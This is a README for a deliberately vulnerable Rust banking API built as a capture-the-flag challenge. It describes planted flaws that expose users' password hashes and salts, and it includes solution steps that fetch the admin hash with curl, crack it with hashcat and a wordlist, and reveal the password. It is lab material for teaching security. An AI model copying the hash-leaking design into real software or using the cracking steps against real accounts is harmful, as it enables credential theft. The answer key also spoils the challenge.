# Fake Bank Software
This directory holds the source code for the REST-API that Finch is building for
the WiCys x 7968 git challenge. Below is a check list of what needs to get done:

- Build and implement a simple API for the web server to interact with.
- Set up the sample network.

Specific branches will NOT be publicly available and will be the code that is used on the transaction server.
The repository that will be accessible by competitors will have a similar code base. Branches that are production
ready will be disclosed at a later date.

These branches are:
  - main

**The code we will upload publicly is inside of the project repository on 7968's github organization.**
Please request to be added to the repository by Finch please.

The official page for hosting the program is inside of this private repository:
- [7968luc/apricot-banking-software](https://github.com/7968luc/apricot-banking-software)

## Contributing 
Please submit a pull request if you have working code that is ready to be added to the repository.

# Running and Testing
First clone this repository:
```sh
git clone https://github.com/westwardfishdme/fake_bank_software
# and then once cloned, enter the directory:
cd fake_bank_software
```

To run the server, you must install [Rust](https://rust-lang.org/tools/install/) and use `cargo`
to build the server with:
```sh
cargo run
```

Once running-- you can run the provided [setup script](./setup/setup_ctf.py) to actually
start testing to see how logs are generated. Feel free to comment out any calls to the sleep
function if you want to save your time.

## How logs are generated
All logs generated for the CTF occur in real-time, and will be printed to STDOUT as opposed to an
actual file. If you want to print to a file, use the following syntax below:

```sh
# assuming that you are inside of this directory already:
cargo run > ./log.txt
```


# Flags:

### Implemented
- Anyone can pull any User's authentication information; including the password hash + the salt value used to calculate the hash. 
This will be a flag for the admin account! (implemented) 
- Users will be able to log into one of jordan's actual account and be able to trace the account history to find 
dummy accounts to find money trail. (implemented)
- Users will be able to see commit history and get a flag there (implemented)

### Not Yet Implemented
- ~~Users will be able to switch to an experimental branch with the flag in the readme (implemented)~~

# Solutions
Below are the following solutions to each flag. (replace /path/to/* with the actual path to whichever wordlist is used.)

## Admin Password
1. curl the server with the following GET request and forward the output to hash.txt

```sh 
# obtain the SHA256 hash and the salt value
curl -X GET -H "Content-Type: application/json" -d '{"username":"admin", "password":"password"}' http://localhost:8080/login > hash.txt
```

2. edit the retrieved data to be the following:
### example json that we pull from the server
```json
// formatted nicely for readability
{"password_hash":"dc48bab01feb0646fdc3957e31b728d131271aa280d2d531e141dc8267fb0206",
  "permission_id":0,

  /* The salt will sometimes have escape characters (in this case: `\"`),
  *  The back slash that signifies them must be removed when formatting the
  * hash in the next part.
  */
  "salt":"0fo)<dt`\"`{K#<5_",
  "user":"admin"}
```
### what we want it to be for hashcat to use
<!-- Ignore the fact that it's using yaml here, I needed it to be readable.--> 
```yaml
# what we format to:
dc48bab01feb0646fdc3957e31b728d131271aa280d2d531e141dc8267fb02060:fo)<dt`"`{K#<5_
```

3. run hashcat with the following arguments
```sh
# this will run hashcat to crack SHA256 passwords with the salt appended to the end (as it is done in the server).
# the cracked hash should be "tokiohotel".
hashcat -m 1410 -a 0 hash /path/to/rockyou.txt 
```

4. Login to the admin account with this get request to get the flag:
```sh 
# we get account details from the /account route.
curl -X GET -H "Content-Type: application/json" -d '{"username":"admin", "password":"tokiohotel"}' http://localhost:8080/account
```

## Jordan's Password
Same as the steps above but replace `admin` with `jmercer`; and use `/path/to/bible.txt`


## Some Easter eggs
;) python script has more information

# Readme
the actual readme that will be uploaded to the github page is located inside of this directory here:
- [ readme ](./docs/README.md)
